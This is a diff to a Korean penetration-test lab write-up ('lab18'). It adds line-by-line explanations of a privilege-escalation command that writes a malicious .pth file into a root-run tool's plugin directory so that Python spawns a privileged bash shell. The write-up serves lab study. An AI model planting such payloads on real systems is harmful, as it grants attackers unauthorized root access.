@@ -2,7 +2,7 @@
 publish: true
 title: 모의해킹 보고서 - lab18
 created: 2026-11-12
-modified: 2026-11-12T18:38:44.576Z
+modified: 2026-11-12T18:43:47.465Z
 published: 2026-11-12
 date: 2026-11-12
 tags:
@@ -287,8 +287,10 @@ for path in PLUGINS_DIR.iterdir():
 printf '%s\n' 'import os; os.execl("/bin/bash", "bash", "-p")' > /opt/tools/mlflow_ctl/plugins/dev/root.pth
 ```
 
-`%s\n` -> 문자열을 출력하고 끝에 줄바꿈을 붙여라.
-`/bin/bash`를 실행 권한을 유지한 채(root)
+`printf %s\n` -> 문자열을 출력하고 끝에 줄바꿈을 붙여라.
+`import os; os.execl` -> python 모듈을 불러오고 현재 프로그램을 교체해라
+`/bin/bash`를 실행 권한을 유지한 채(root) 바꿔라.
+-> 이 내용을 `root.pth`로 저장
 
 ![[00. Setting/00. 첨부파일/Pasted image 20261113032810.png]]
 
